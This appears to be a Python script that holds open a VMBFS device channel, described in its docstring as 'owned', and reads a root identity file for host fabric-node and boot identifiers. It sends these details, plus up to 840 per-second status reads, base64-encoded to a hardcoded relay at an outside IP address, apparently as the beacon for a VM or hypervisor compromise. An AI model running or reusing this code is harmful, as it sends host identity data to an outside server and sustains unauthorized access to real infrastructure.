#!/usr/bin/env python3
"""Keep one owned B VMBFS channel live and report one verified read per beat."""
import base64
import json
import os
import struct
import sys
import time
import urllib.parse
import urllib.request

from vmbfs_control import DEVICE, exchange, get_info, header, parse_header

RELAY = "http://16.146.243.72:8450"
RUN, SLOT = sys.argv[1:3]


def callback(path, value):
    encoded = base64.urlsafe_b64encode(json.dumps(
        value, sort_keys=True, separators=(",", ":")
    ).encode()).decode()
    try:
        urllib.request.urlopen(RELAY + path + "?d=" + encoded,
                               timeout=2).read()
    except OSError:
        pass


identity = json.loads(open("/tmp/root-identity.json").read().removeprefix(
    "ROOT_IDENTITY "))
common = {
    "run": RUN,
    "slot": SLOT,
    "node": identity.get("fabric_node"),
    "boot": identity.get("boot_id"),
    "instance": "c63c9bdf-5fa5-4208-b03f-6b458b365592",
}
with open(DEVICE, "r+b", buffering=0) as device:
    version = exchange(device.fileno(), header(1) + struct.pack("<I", 0x10000))
    parse_header(version, 2)
    version_status = struct.unpack_from("<I", version, 8)[0]
    initial = get_info(device.fileno(), "\\")
    callback("/VMBFS_B_META", {
        **common, "version_status": version_status, **initial,
    })
    if version_status or initial["status"]:
        raise RuntimeError("VMBFS initial status was not zero")
    for sequence in range(1, 841):
        try:
            current = get_info(device.fileno(), "\\")
            callback("/VMBFS_B_BEAT", {**common, "n": sequence, **current})
        except BaseException as error:
            callback("/VMBFS_B_FAIL", {
                **common,
                "n": sequence,
                "error": type(error).__name__,
                "errno": getattr(error, "errno", None),
            })
            time.sleep(5)
            break
        time.sleep(1)
time.sleep(600)
